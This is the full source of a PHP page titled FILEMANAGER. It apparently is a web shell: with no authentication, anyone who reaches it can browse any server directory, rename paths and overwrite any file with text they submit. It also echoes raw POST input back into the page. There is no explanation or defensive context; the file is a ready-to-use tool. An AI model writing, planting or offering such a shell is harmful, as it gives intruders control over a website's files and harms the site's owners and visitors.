<!DOCTYPE html>
<html>
<head>
  <title></title>
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</head>
<style type="text/css">
  button {
    background:none;
    border:none;
    outline:none;
  }
  button:focus {
    outline:none;
  }
  button:hover {
    cursor: pointer;
  }
  td {
    padding:5px;
  }
  td.size {
    text-align:right;
    width:100px;
  }
  td.permission {
    text-align:right;
    width:100px;
  }
  td.img {
    width:10px;
  }
  td.action {
    width:12%;
  }
  .icon {
    max-width:25px;
    max-height:25px;
  }
  @media screen and (max-width: 600px) {
    td.img {
      display:none;
    }
  }
</style>
<body>
  <br>
<div class="container">
  <div class="card mb-3" style="max-width: 100%;">
    <div class="card-header"><h4>FILEMANAGER</h4></div>
    <div class="card-body">
      <table width="100%">
        <?php
        function cwd() {
          if (isset($_POST['dir'])) {
            $cwd = $_POST['dir'];
            chdir($cwd);
          } else {
            $cwd = str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
          } return $cwd;
        }
        function perms($file) {
          $perms = fileperms($file);
          switch ($perms & 0xF000) {
            case 0xC000:
              $info = 's';
            break;
            case 0xA000:
              $info = 'l';
            break;
            case 0x8000: 
              $info = 'r';
            break;
            case 0x6000:
              $info = 'b';
            break;
            case 0x4000:
              $info = 'd';
            break;
            case 0x2000:
              $info = 'c';
            break;
            case 0x1000:
              $info = 'p';
            break;
          default: 
              $info = 'u';
            }
          $info .= (($perms & 0x0100) ? 'r' : '-');
          $info .= (($perms & 0x0080) ? 'w' : '-');
          $info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

          $info .= (($perms & 0x0020) ? 'r' : '-');
          $info .= (($perms & 0x0010) ? 'w' : '-');
          $info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

          $info .= (($perms & 0x0004) ? 'r' : '-');
          $info .= (($perms & 0x0002) ? 'w' : '-');
          $info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

          return $info;
        }
        function permission($filename, $perms, $po=false) {
          if (is_writable($filename)) {
            ?> <font color="green"><?php print $perms ?></font> <?php
          } else {
            ?> <font color="red"><?php print $perms ?></font> <?php
          }
        }
        function size($file,$digits = 2) {
          if (is_file($file)) {
            $filePath = $file;
            if (!realpath($filePath)) {
              $filePath = $_SERVER["DOCUMENT_ROOT"].$filePath;
            }
            $fileSize = filesize($filePath);
            $sizes = array("TB","GB","MB","KB","Byte");
            $total = count($sizes);
            while ($total-- && $fileSize > 1024) {
              $fileSize /= 1024;
            } return round($fileSize, $digits)." ".$sizes[$total];
          } return false;
        }
        function getExtFile($file) {
          $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
          switch ($ext) {
            case 'php':
              print("https://image.flaticon.com/icons/png/128/337/337947.png");
              break;
            case 'pl':
                  print("https://image.flaticon.com/icons/svg/186/186645.svg");
                  break;
                case 'xml':
                  print("https://image.flaticon.com/icons/svg/136/136526.svg");
                  break;
                case 'json':
                  print("https://image.flaticon.com/icons/svg/136/136525.svg");
                  break;
                case 'exe':
                  print("https://image.flaticon.com/icons/svg/136/136531.svg");
                  break;
                case 'png':
                  print("https://image.flaticon.com/icons/svg/337/337948.svg");
                  break;
                case 'html':
                  print("https://image.flaticon.com/icons/png/128/136/136528.png");
                  break;
                case 'css':
                  print("https://image.flaticon.com/icons/png/128/136/136527.png");
                  break;
                case 'ico':
                  print("https://image.flaticon.com/icons/png/128/1126/1126873.png");
                  break;
                case 'jpg':
                  print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', getcwd().'/'.basename ($file))."");
                  break;
                case 'jpeg':
                  print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', getcwd().'/'.basename ($file))."");
                  break;
                case 'gif':
                  print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', getcwd().'/'.basename ($file))."");
                  break;
                case 'pdf':
                  print("https://image.flaticon.com/icons/png/128/136/136522.png");
                  break;
                case 'mp4':
                  print("https://image.flaticon.com/icons/png/128/136/136545.png");
                  break;
                case 'py':
                  print("https://image.flaticon.com/icons/png/128/180/180867.png");
                  break;
                case 'c':
                  print("https://image.flaticon.com/icons/svg/2306/2306037.svg");
                  break;
                case 'bmp':
                  print("https://image.flaticon.com/icons/svg/337/337925.svg");
                  break;
                case 'cpp':
                  print("https://image.flaticon.com/icons/svg/2306/2306030.svg");
                  break;
                case 'txt':
                  print("https://image.flaticon.com/icons/png/128/136/136538.png");
                  break;
                case 'zip':
                  print("https://image.flaticon.com/icons/png/128/136/136544.png");
                  break;
                case 'js':
                  print("https://image.flaticon.com/icons/png/128/1126/1126856.png");
                  break;
                case 'dll':
                  print("https://image.flaticon.com/icons/svg/2306/2306057.svg");
                  break;
            default:
              print("https://image.flaticon.com/icons/svg/833/833524.svg");
              break;
          }
        }
        switch (@$_POST['action']) {
          case 'rename':
          if (isset($_POST['submit'])) {
            if (rename($_POST['file'] , $_POST['newname'])) {
              ?>
              <tr>
                <td>
                  rename success
                </td>
              </tr>
              <?php
            } else {
              ?>
              <tr>
                <td>
                  rename failed
                </td>
              </tr>
              <?php
            }
          }
          switch ($_POST['file']) {
            case filetype($_POST['file']) == 'dir' :
              ?>
                <tr>
                  <td>
                    Filename : <?= basename($_POST['file']) ?>
                  </td>
                </tr>
                <tr>
                  <td>
                    <form method="post">
                      <select class="form-control" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
                        <option value="back">back</option>
                        <option value="rename" selected>rename</option>
                      </select>
                    </form>
                  </td>
                </tr>
                <tr>
                  <form method="post">
                  <td>
                    <input class="form-control" type="text" name="newname" value="<?= basename($_POST['file']) ?>">
                  </td>
                </tr>
                <tr>
                  <td>
                    <input type="submit" name="submit" class="btn btn-secondary" style="width:100%;">
                  </td>
                </tr>
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
              </form>
              <?php
              exit();
              break;
            
            default:
              # code...
              break;
          }
          break;
          case 'edit':
            if (isset($_POST['submit'])) {
              $handle = fopen($_POST['file'] , 'w');
              if (fwrite($handle, $_POST['text'])) {
                ?>
                <tr>
                  <td>
                    success edit
                  </td>
                </tr>
                <?php
              } else {
                ?>
                <tr>
                  <td>
                    failed edit
                  </td>
                </tr>
                <?php
              } 
            } $file = htmlspecialchars(file_get_contents($_POST['file']));
            ?>
                <tr>
                  <td>
                    Filename : <?= basename($_POST['file']) ?>
                  </td>
                </tr>
                <tr>
                  <td>
                    <form method="post">
                      <select class="form-control" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
                        <option value="back">back</option>
                        <option value="edit" selected>edit</option>
                      </select>
                    </form>
                  </td>
                </tr>
                <tr>
                  <form method="post">
                  <td>
                    <textarea class="form-control" style="height:350px;" name="text"><?= $file ?></textarea>
                  </td>
                </tr>
                <tr>
                  <td>
                    <input type="submit" name="submit" class="btn btn-secondary" style="width:100%;">
                  </td>
                </tr>
                <input type="hidden" name="action" value="edit">
                <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
              </form>
              <?php
              exit();
            break;
        }
        if(function_exists('opendir')) {
          if($opendir = opendir(cwd())) {
          while(($readdir = readdir($opendir)) !== false) {
            $getpath[] = $readdir;
          } closedir($opendir);
        } sort($getpath);
        } else {
          $getpath = scandir(cwd());
        }
        foreach ($getpath as $files) {
          ?>
          <tr>
              <td class="img">
                <?php
                switch ($files) {
                  case filetype($files) == 'dir' :
                    ?> <img src='https://image.flaticon.com/icons/svg/716/716784.svg' class='icon' title='<?=$files?>'> <?php
                    break;
                  
                  case filetype($files) == 'file' :
                    ?> <img class="icon" src="<?= getExtFile($files) ?>"> <?php
                    break;
                }
                ?>
              </td>
              <td>
                <?php
                switch ($files) {
                  case filetype($files) == 'dir':
                    if (is_dir($files) || $files === '.' || $files === '..') {
                      ?><form method="post">
                          <button name="dir" value="<?= cwd().'/'.$files ?>"><?= $files ?></button>
                        </form>
                      <?php
                    }
                    break;
                  
                  case filetype($files) == 'file':
                    if (!is_file($files)) continue 2;
                    print($files);
                    break;
                }
                ?>
              </td>
              <td class="size">
                <?php
                switch ($files) {
                  case filetype($files) == 'dir':
                    ?> <?= filetype($files) ?><?php
                    break;
                  
                  default:
                    ?> <?=size($files)?><?php
                    break;
                }
                ?>
              </td>
              <td class="permission">
                <?= permission($files, perms($files)) ?>
              </td>
              <td class="action">
                <?php
                switch ($files) {
                  case filetype($files) == 'file' :
                    switch (pathinfo($files, PATHINFO_EXTENSION)) {
                      case "png":
                      case "jpg":
                      case "jpeg":
                      case "bmp":
                      case "ico":
                        ?>
                        <form method="post">
                          <select class="form-control" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
                            <option selected>choose . .</option>
                            <option value="open">open</option>
                          </select>
                          <input type="hidden" name="file" value="<?= cwd().'/'.$files ?>">
                        </form>
                        <?php
                        break;
                      
                      default:
                        ?>
                        <form method="post">
                          <select class="form-control" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
                            <option selected>choose . .</option>
                            <option value="edit">edit</option>
                          </select>
                          <input type="hidden" name="file" value="<?= cwd().'/'.$files ?>">
                        </form>
                        <?php
                        break;
                    }
                    break;
                  
                  default:
                    ?>
                    <form method="post">
                      <select class="form-control" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
                        <option selected>choose . .</option>
                        <option value="rename">rename</option>
                      </select>
                      <input type="hidden" name="file" value="<?= cwd().'/'.$files ?>">
                    </form>
                    <?php
                    break;
                }
                ?>
              </td>
            </tr>
            <?php
          }
        ?>
      </table>
  </div>
</div>
</div>
</body>
</html>
